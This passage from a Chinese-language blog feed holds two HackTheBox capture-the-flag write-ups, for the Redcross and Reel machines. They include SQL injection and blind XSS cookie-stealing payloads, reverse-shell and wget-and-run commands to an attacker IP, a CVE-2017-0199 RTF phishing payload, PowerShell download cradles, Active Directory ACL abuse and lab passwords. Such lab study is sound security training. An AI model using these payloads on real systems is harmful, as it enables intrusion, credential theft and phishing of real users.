<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.113    intra.redcross.htb redcross.htb</span><br></pre></td></tr></table></figure>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Redcross/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>登录首页，发现了疑似文件名参数</p>
<p><img src="/images/Redcross/2.png" alt="2"></p>
<p>证书提示了某个用户名</p>
<p><img src="/images/Redcross/3.png" alt="3"></p>
<p>目录枚举，知道对方在使用php，添加扩展名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;zidian.txt -x .php -o dir.txt -t 10 -k</span><br></pre></td></tr></table></figure>

<p>但这样枚举效率很低，有更好的字典作为选择</p>
<p>枚举php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;Common-PHP-Filenames.txt -o dir.txt -t 10 -k </span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/4.png" alt="4"></p>
<p>没有枚举出太多，检查源代码</p>
<p><img src="/images/Redcross/5.png" alt="5"></p>
<p>发现还有一个/pages/目录下，存在php文件，继续枚举该目录</p>
<p><img src="/images/Redcross/6.png" alt="6"></p>
<p>发现了更多的文件，其中存在login.php</p>
<p><img src="/images/Redcross/7.png" alt="7"></p>
<p>可以发现，之前首页包含的就是这个文件，不过该参数测试后，应该不存在文件包含漏洞</p>
<p>进行常规目录枚举</p>
<p><img src="/images/Redcross/8.png" alt="8"></p>
<p>发现了documentation目录，不过不显示文件</p>
<p><img src="/images/Redcross/9.png" alt="9"></p>
<p>对于改文件名，应该枚举常见文档格式pdf，txt</p>
<p><img src="/images/Redcross/12.png" alt="12"></p>
<p>发现了pdf</p>
<p><img src="/images/Redcross/13.png" alt="13"></p>
<p>使用wfuzz进行子域名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -H &#39;HOST: FUZZ.redcross.htb&#39; -u &#39;https:&#x2F;&#x2F;10.10.10.113&#39; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;shubs-subdomains.txt --hw 28</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/14.png" alt="14"></p>
<p>得到了admin子域</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="第一步-成功登录到admin域"><a href="#第一步-成功登录到admin域" class="headerlink" title="第一步:成功登录到admin域"></a>第一步:成功登录到admin域</h3><p>回到最初的登录页面，已知的用户名<code>penelope</code>，尝试一些登录凭据组合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">password</span><br><span class="line">guset</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>

<p><code>guest/guest</code>可以成功登录，或者之前的pdf的描述，提供了一个功能</p>
<p>标题输入credentials，内容输入username=</p>
<p><img src="/images/Redcross/21.png" alt="21"></p>
<p>会告诉你临时凭据</p>
<p><img src="/images/Redcross/22.png" alt="22"></p>
<h4 id="方法1-guset登录SQL注入"><a href="#方法1-guset登录SQL注入" class="headerlink" title="方法1:guset登录SQL注入"></a>方法1:guset登录SQL注入</h4><p>登录成功发现一处查询点</p>
<p><img src="/images/Redcross/10.png" alt="10"></p>
<p>疑似容易受到sql注入攻击，并且数据库为MariaDB，且闭合应该为<code>&#39;)</code></p>
<p><img src="/images/Redcross/11.png" alt="11"></p>
<p>尝试sql报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,version(),0x7e),1)#</span><br><span class="line">&#39;) and extractvalue(0x0a,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/15.png" alt="15"></p>
<p>中间过程省略</p>
<p>爆用户名，一切正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 1,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>爆密码有些不一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/16.png" alt="16"></p>
<p>得到<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX</code>，没有显示完全，可以使用substring()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select substring((select password from redcross.users limit 0,1)from 30)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/17.png" alt="17"></p>
<p>得到<code>Kt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
<p>组合在一起就是<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
<p><code>hash-identifier</code>没有识别出哈希类型，直接放到john去破解</p>
<p>破解出了charles用户的密码，这个哈希加密类型是blowfish加密，之破解出了charles的密码</p>
<p><code>$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i</code>:<code>cookiemonster</code></p>
<p><img src="/images/Redcross/18.png" alt="18"></p>
<p>尝试使用sqlmap进行自动化注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli -p &#39;o&#39; --force-ssl --dbms mysql --batch</span><br></pre></td></tr></table></figure>

<p>但是这里报错了，看起来是找到正确的注入点，但是对方停止了响应</p>
<p><img src="/images/Redcross/19.png" alt="19"></p>
<p>查看后是对方的waf或者其他安全策略，把我们给BAN了，所以sqlmap挂了</p>
<p>这里可以通过delay设置请求之间等待时间，这会让攻击时间变长，因为原来请求之间没有时间间隔</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --force-ssl --dbms mysql --batch --delay&#x3D;1</span><br></pre></td></tr></table></figure>

<p>这样sqlmap可以正常使用</p>
<p><img src="/images/Redcross/20.png" alt="20"></p>
<p>使用charles的凭据进行登录，页面没有多出可以操作的东西</p>
<p>但是提示了alerts，联想到XSS</p>
<p><img src="/images/Redcross/23.png" alt="23"></p>
<p>尝试凭据登录admin域，失败</p>
<p><img src="/images/Redcross/25.png" alt="25"></p>
<p>将intra域的<code>PHPSESSID</code>替换到admin域的<code>PHPSESSID</code>，刷新页面，可以直接以charles的身份登录</p>
<p><img src="/images/Redcross/24.png" alt="24"></p>
<h4 id="方法2-guest会话固定"><a href="#方法2-guest会话固定" class="headerlink" title="方法2:guest会话固定"></a>方法2:guest会话固定</h4><p>intra域guest的<code>PHPSESSID</code>也可以直接登录到admin域的页面，这里谁的身份都无所谓，功能都能使用</p>
<p><img src="/images/Redcross/26.png" alt="26"></p>
<h4 id="方法3-XSS"><a href="#方法3-XSS" class="headerlink" title="方法3:XSS"></a>方法3:XSS</h4><p>之前给guest凭据的类似留言板的功能，存在XSS，这是一个盲打XSS的情况，可以直接窃取到管理员的cookie</p>
<p>这里需要注意，xss的地点在电话那一栏，其他地方没有用。paylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;new Image().src&#x3D;&#39;http:&#x2F;&#x2F;10.10.16.4&#x2F;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/28.png" alt="28"></p>
<p>之后登录cookie登录admin域就是admin</p>
<p><img src="/images/Redcross/29.png" alt="29"></p>
<h3 id="第二步-shell"><a href="#第二步-shell" class="headerlink" title="第二步:shell"></a>第二步:shell</h3><p>首先有一个用户管理功能，可以添加用户</p>
<p><img src="/images/Redcross/30.png" alt="30"></p>
<p>但是权限很低，基本啥都干不了</p>
<p><img src="/images/Redcross/31.png" alt="31"></p>
<h4 id="方法1-防火墙→Haraka-RCE"><a href="#方法1-防火墙→Haraka-RCE" class="headerlink" title="方法1:防火墙→Haraka RCE"></a>方法1:防火墙→Haraka RCE</h4><p>页面有防火墙添加白名单功能，输入自己的ip，重新进行端口扫描，发现了新的端口</p>
<p><img src="/images/Redcross/32.png" alt="32"></p>
<p>1025没有得到指纹，尝试用nc或者telnet获得banner</p>
<p><img src="/images/Redcross/34.png" alt="34"></p>
<p>等了比较久的时间，发现了haraka，知道公开漏洞</p>
<p><img src="/images/Redcross/33.png" alt="33"></p>
<p>需要修改默认端口</p>
<p><img src="/images/Redcross/35.png" alt="35"></p>
<p>之后反弹shell，需要制定知道的邮箱地址<code>penelope@redcross.htb</code>，后来测试发现，用之前创建的用户<code>test@redcross.htb</code>也可以</p>
<p>这个反弹shell非常慢，使用nc进行反弹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 41162.py -c &quot;cd &#x2F;tmp;wget http:&#x2F;&#x2F;10.10.16.4&#x2F;nc; chmod 777 .&#x2F;nc; .&#x2F;nc 10.10.16.4 443 -e &#x2F;bin&#x2F;bash&quot; -t penelope@redcross.htb -m 10.10.10.113</span><br></pre></td></tr></table></figure>

<p>获得shell</p>
<p><img src="/images/Redcross/36.png" alt="36"></p>
<h4 id="方法2-命令注入"><a href="#方法2-命令注入" class="headerlink" title="方法2:命令注入"></a>方法2:命令注入</h4><p>添加防火墙白名单尝试进行命令注入，添加处注入失败</p>
<p><img src="/images/Redcross/37.png" alt="37"></p>
<p>deny处添加成功</p>
<p><img src="/images/Redcross/38.png" alt="38"></p>
<p>反弹shell命令即可</p>
<p><img src="/images/Redcross/39.png" alt="39"></p>
<p>不过这里权限更低一些</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先想到找凭据，因为之前mysql注入得到了MariaDB的内容，但是里面的凭据不能登录admin</p>
<h3 id="方法1-设置uid"><a href="#方法1-设置uid" class="headerlink" title="方法1:设置uid"></a>方法1:设置uid</h3><p>首先找到postgresql</p>
<p><img src="/images/Redcross/40.png" alt="40"></p>
<p>找到mysql的凭据，不能切换用户，其他和sql注入一致</p>
<p><img src="/images/Redcross/41.png" alt="41"></p>
<p>搜索postgresql的连接函数pg_connect，可以找到凭据，在<code>/var/www/html/admin/pages/actions.php</code></p>
<p><code>unixusrmgr/dheu%7wjx8B&amp;</code>和<code>www/aXwrtUO9_aa&amp;</code>，肯定用高权限</p>
<p><img src="/images/Redcross/42.png" alt="42"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixusrmgr unix</span><br><span class="line">dheu%7wjx8B&amp;</span><br></pre></td></tr></table></figure>

<p>之后找到常用命令:<a href="https://blog.csdn.net/u010856284/article/details/70142810">https://blog.csdn.net/u010856284/article/details/70142810</a></p>
<p>之后找到了有意思的信息</p>
<p><img src="/images/Redcross/43.png" alt="43"></p>
<p>数据库存在uid和gid信息，还存在密码信息，密码格式为MD5(Unix)，尝试创建一个uid和gid为0的用户</p>
<p>先生成密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 evil</span><br><span class="line">$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0</span><br></pre></td></tr></table></figure>

<p>再尝试插入，但权限不足</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/44.png" alt="44"></p>
<p>查看权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\dt</span><br></pre></td></tr></table></figure>

<p>发现只能修改4个参数，其中不包括UID</p>
<p><img src="/images/Redcross/45.png" alt="45"></p>
<p>所以修改一下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/46.png" alt="46"></p>
<p>使用<code>evil/evil</code>进行ssh登录，获得了gid权限</p>
<p><img src="/images/Redcross/47.png" alt="47"></p>
<p>linpeas扫描，注意conf文件和密码文件，可以发现另一处postgresql凭据</p>
<p><img src="/images/Redcross/48.png" alt="48"></p>
<p>使用它们去登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixnssroot unix</span><br><span class="line">30jdsklj4d_3</span><br></pre></td></tr></table></figure>

<p>发现这次可以修改gid了</p>
<p><img src="/images/Redcross/49.png" alt="49"></p>
<p>尝试修改uid权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update passwd_table set uid&#x3D;0 where username&#x3D;&#39;evil&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/50.png" alt="50"></p>
<p>重新ssh，但是不行，uid没变，尝试重新创建一个uid0用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 hacker1337!</span><br><span class="line">$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61</span><br></pre></td></tr></table></figure>

<p>最好也别把目录设置成<code>/tmp</code>了，目录一致可能有问题，需要把之前的uid0给改掉，这是一个primary key </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;hacker&#39;, &#39;$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61&#39;, 0, 0, &#39;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/51.png" alt="51"></p>
<p>成功提权</p>
<h3 id="方法2-设置gid"><a href="#方法2-设置gid" class="headerlink" title="方法2:设置gid"></a>方法2:设置gid</h3><p>有很多的组都有很大几率获得权限提升:<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe</a></p>
<p>查看sudo组编号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil@redcross:&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;pages$ cat &#x2F;etc&#x2F;group |grep sudo</span><br><span class="line">sudo:x:27:</span><br></pre></td></tr></table></figure>

<p>创建sudo组用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;sudoo&#39;, &#39;$1$YRdG0wu4$.7lHDv1rbDHgghX1iv5eS&#x2F;&#39;, 27, &#39;&#x2F;tmp&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p>ssh过去，发现sudo权限为all</p>
<p><img src="/images/Redcross/52.png" alt="52"></p>
<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>还有ROP chain的bof，超出能力范围</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Reel</title>
    <url>/2021/05/29/HTB-Reel/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Reel/1.png" alt="1"></p>
<p>FTP允许匿名访问。发下了3个文件，其中有两个是docx文件</p>
<p><img src="/images/Reel/2.png" alt="2"></p>
<p>在Linux中，可以使用<code>libreoffice</code>或者<code>docx2txt</code>将docx转换为txt进行查看，命令类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docx2txt FileName.docx - |less</span><br></pre></td></tr></table></figure>

<p><code>AppLocker.docx</code>似乎描述了Windows上AppLocker的策略，之后可能会影响到提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.</span><br></pre></td></tr></table></figure>

<p><code>readme.txt</code>提示给某个用户以邮件的形式发送rtf文件，该用户会对其进行转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">please email me any rtf format procedures - I&#39;ll review and convert.</span><br><span class="line"></span><br><span class="line">new format &#x2F; converted documents will be saved here.</span><br></pre></td></tr></table></figure>

<p><code>Windows Event Forwarding.docx</code>无法用<code>docx2txt</code>或者<code>libreoffice</code>打开，还是老老实实office 365。里面大概的内容似乎是一些日志，像是运维人员记录的，没有太多有趣信息。不过在作者栏，我发现了一个邮箱地址<code>nico@megabank.com</code></p>
<p><img src="/images/Reel/3.png" alt="3"></p>
<p>在Linux中，可以用通过<code>exiftool</code>来获取</p>
<p><img src="/images/Reel/4.png" alt="4"></p>
<p>为了确认邮箱用户的存在，我尝试手动连接SMTP服务器通过RCPT收件人进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -C -nv 10.10.10.77 25</span><br><span class="line"></span><br><span class="line">HELO arsene@evil.com</span><br><span class="line">250 Hello.</span><br><span class="line">Mail From: &lt;arsene@evil.com&gt;</span><br><span class="line">250 OK</span><br><span class="line">RCPT TO: &lt;nico@megabank.com&gt;</span><br><span class="line">250 OK</span><br><span class="line">RCPT TO: &lt;blabla@megabank.com&gt;</span><br><span class="line">550 Unknown user</span><br></pre></td></tr></table></figure>

<p>所以，可以认为<code>nico@megabank.com</code>应该是个存在的账户</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>谷歌搜索<code>rtf file exploit</code>，发现<code>CVE-2017-0199</code>。简单来看该漏洞利用OLE，来下载恶意攻击者的HTA文件</p>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>可以使用msfvenom生成恶意HTA文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.16.12 LPORT&#x3D;4444 -f hta-psh -o meterpreter.hta</span><br></pre></td></tr></table></figure>

<p>python脚本生成恶意RTF文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http:&#x2F;&#x2F;10.10.16.12&#x2F;meterpreter.hta -t rtf -x 0</span><br></pre></td></tr></table></figure>

<p>之后发送邮件即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f 发送者</span><br><span class="line">-t 接收者</span><br><span class="line">-u 消息主题</span><br><span class="line">-m 消息内容</span><br><span class="line">-a 附件</span><br><span class="line">-s smtp服务器</span><br><span class="line">-v verbose</span><br><span class="line"></span><br><span class="line">sendEmail -f arsene@megabank.com -t nico@megabank.com -u &quot;Evil RTF&quot; -m &quot;Please give me shell&quot; -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/5.png" alt="5"></p>
<h2 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h2><p>msfvenom是我常用的，<code>nishang</code>的<code>Out-HTA.ps1</code>也可以生成恶意的HTA文件，并且可以通过指定<code>-PayloadURL</code>来加载ps1脚本，这样会比msfvenom多一次请求，但比较方便调试和学习。在kali中直接使用pwsh(powershell)生成，默认的文件名为<code>WindDef_WebInstall.hta</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .&#x2F;Out-HTA.ps1</span><br><span class="line">Out-HTA -PayloadURL http:&#x2F;&#x2F;10.10.16.12&#x2F;Invoke-PowerShellTcp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/6.png" alt="6"></p>
<p>方便区分，重新生成个恶意RFT文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http:&#x2F;&#x2F;10.10.16.12&#x2F;WindDef_WebInstall.hta -t rtf -x 0</span><br></pre></td></tr></table></figure>

<p>检查hta和ps1文件，之后发送邮件即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sendEmail -f arsene@megabank.com -t nico@megabank.com -u &quot;Evil RTF&quot; -m &quot;Please give me shell&quot; -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p>这让过程更加清晰了一些</p>
<p><img src="/images/Reel/7.png" alt="7"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="User1"><a href="#User1" class="headerlink" title="User1"></a>User1</h2><p>这里运气真好，查看user.txt的时候发现了加密的凭据</p>
<p><img src="/images/Reel/8.png" alt="8"></p>
<p>解密即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; $pass&#x3D;&quot;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c0000</span><br><span class="line">00010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c279</span><br><span class="line">4e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&quot; |ConvertTo-SecureString    </span><br><span class="line">PS C:\&gt; $user&#x3D;&quot;HTB\Tom&quot;                                                                                                         </span><br><span class="line">PS C:\&gt; $cred&#x3D;New-Object System.Management.Automation.PSCredential($user,$pass)                                                 </span><br><span class="line">PS C:\&gt; $cred                                                                                                                   </span><br><span class="line"></span><br><span class="line">UserName                                                                                                               Password </span><br><span class="line">--------                                                                                                               -------- </span><br><span class="line">HTB\Tom                                                                                            System.Security.SecureString                                                                   </span><br><span class="line">PS C:\&gt; $cred.GetNetworkCredential() |fl *                                                                                      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName       : Tom                                                                                                            </span><br><span class="line">Password       : 1ts-mag1c!!!                                                                                                   </span><br><span class="line">SecurePassword : System.Security.SecureString                                                                                   </span><br><span class="line">Domain         : HTB </span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Import-CliXml -Path cred.xml).GetNetworkCredential() | fl *</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/9.png" alt="9"></p>
<p>我们可以移动到tom</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br><span class="line">1ts-mag1c!!!</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/12.png" alt="12"></p>
<p>在移动到该用户前，我决定检查之前提示的applocker策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-AppLockerPolicy -Effective -Xml | Set-Content (&quot;$pwd\policy.xml&quot;)</span><br></pre></td></tr></table></figure>

<p>这里有个问题，将policy.xml复制到kali上，似乎出现了字符的问题</p>
<p><img src="/images/Reel/10.png" alt="10"></p>
<p>这是个很头疼的问题，并没有很顺利的解决。。。只能靠手来复制</p>
<p><img src="/images/Reel/11.png" alt="11"></p>
<p>这个文件很大，而且使用了<code>hash rule</code>，没有什么可能完成逃逸</p>
<p><img src="/images/Reel/13.png" alt="13"></p>
<p>但这里ps1脚本还是能够执行的，比如powerup发现了Nico的凭据</p>
<p><img src="/images/Reel/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh nico@10.10.10.77</span><br><span class="line">4dri@na2017!**</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/15.png" alt="15"></p>
<h2 id="User2"><a href="#User2" class="headerlink" title="User2"></a>User2</h2><p>在tom用户的桌面发现了<code>AD Audit</code>目录，里面有note.txt</p>
<p>提示了:有人运行了BloodHound但没有发现user攻击Domain Admin的最短路径，他们应该添加一个组，然后重新运行BloodHound</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Findings:                                                                                                                       </span><br><span class="line"></span><br><span class="line">Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  </span><br><span class="line"></span><br><span class="line">Maybe we should re-run Cypher query against other groups we&#39;ve created.</span><br></pre></td></tr></table></figure>





<p>机器自带BloodHound和PowerView</p>
<p><img src="/images/Reel/16.png" alt="16"></p>
<p>同时发现了<code>acls.csv</code>，里面存有AD对象的信息，非常有价值，类似如下</p>
<p><img src="/images/Reel/17.png" alt="17"></p>
<p>可以使用过滤器，来寻找已经用友权限用户的信息</p>
<p>发现对于用户Clarie和Herman具有WriteOwner权限</p>
<p><img src="/images/Reel/18.png" alt="18"></p>
<p>根据<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces">文章1</a> <a href="https://adsecurity.org/?p=3658">文章2</a>，该权限似乎可以接管上述用户，完成横向移动</p>
<p>开始使用BloodHound，这里还是用我自己的，至少可以确保是最新的，这次使用ps1版的</p>
<p>挂载smb，然后到挂载点执行，方便文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use Z: \\10.10.16.12\share</span><br><span class="line">Z:</span><br><span class="line">iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.16.12&#x2F;SharpHound.ps1&#39;); Invoke-BloodHound -CollectionMethod All</span><br></pre></td></tr></table></figure>

<p>导入之后，确认之前提示所说，当前拥有的用户没法直接到达Domain Admins组</p>
<p><img src="/images/Reel/21.png" alt="21"></p>
<p>在Tom用户的<code>First Degree Object Control</code>表明，我们似乎可以直接横向移动到CLAIRE用户</p>
<p><img src="/images/Reel/19.png" alt="19"></p>
<p>之后选择<code>Transitive Object Control</code>，间接表明，CLARIE用户具有<code>GenericWrite</code>权限，可以直接添加到BACKUP_ADMINS组里</p>
<p><img src="/images/Reel/20.png" alt="20"></p>
<p>所以为了完成这个过程，需要使用<code>PowerView</code>，并需要3个步骤</p>
<p>首先添加当前用户Tom，成为Claire的ACL的拥有者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-DomainObjectOwner -identity claire -OwnerIdentity tom</span><br></pre></td></tr></table></figure>

<p>这样，我们就可以进一步添加额外的权限，比如修改Claire用户密码的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword</span><br></pre></td></tr></table></figure>

<p>为了学习，确认命令生效，再次运行BloodHound并导入，定位到用户Tom，发现权限生效</p>
<p><img src="/images/Reel/22.png" alt="22"></p>
<p>最后一步修改密码，注意密码对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pass &#x3D; ConvertTo-SecureString &quot;p@ssw0rd123&quot; -AsPlainText -force</span><br><span class="line">Set-DomainUserPassword -identity claire -accountpassword $pass</span><br></pre></td></tr></table></figure>

<p>完整命令如下</p>
<p><img src="/images/Reel/23.png" alt="23"></p>
<p>之后就可以ssh到用户Claire了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh claire@10.10.10.77</span><br><span class="line">p@ssw0rd123</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/24.png" alt="24"></p>
<h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>之前已经分析过了当前用于Claire具有对Backup_Admins组的<code>GenericWrite</code>权限，我们可以直接提升到该组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.16.12&#x2F;powerview.ps1&#39;)</span><br><span class="line">$pass &#x3D; ConvertTo-SecureString &quot;p@ssw0rd123&quot; -AsPlainText -force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&quot;HTB\Claire&quot;,$pass)</span><br><span class="line">Add-DomainGroupMember -Identity &quot;Backup_Admins&quot; -Members Claire -Credential $cred</span><br></pre></td></tr></table></figure>

<p>或者直接<code>net.exe</code>也行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group backup_admins claire &#x2F;add</span><br></pre></td></tr></table></figure>

<p>之后查看身份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainGroup -MemberIdentity claire |select-object samaccount</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/25.png" alt="25"></p>
<p>这里需要注意，需要重新SSH才能让组修改生效</p>
<p>之后查看，我们对Administrators目录已经具有F权限</p>
<p><img src="/images/Reel/26.png" alt="26"></p>
<p>但是仍然缺少对root.txt的读取权限</p>
<p><img src="/images/Reel/27.png" alt="27"></p>
<p>简单快速的枚举，在Administrator目录里的其他文件里，找到了密码</p>
<p><img src="/images/Reel/28.png" alt="28"></p>
<p>这样直接就获得了Administrator权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh Administrator@10.10.10.77</span><br><span class="line">Cr4ckMeIfYouC4n!</span><br></pre></td></tr></table></figure>

<p><img src="/images/Reel/29.png" alt="29"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在Administrator权限下，查看了root.txt，确认之之前用户组权限无法读取的原因</p>
<p><img src="/images/Reel/30.png" alt="30"></p>
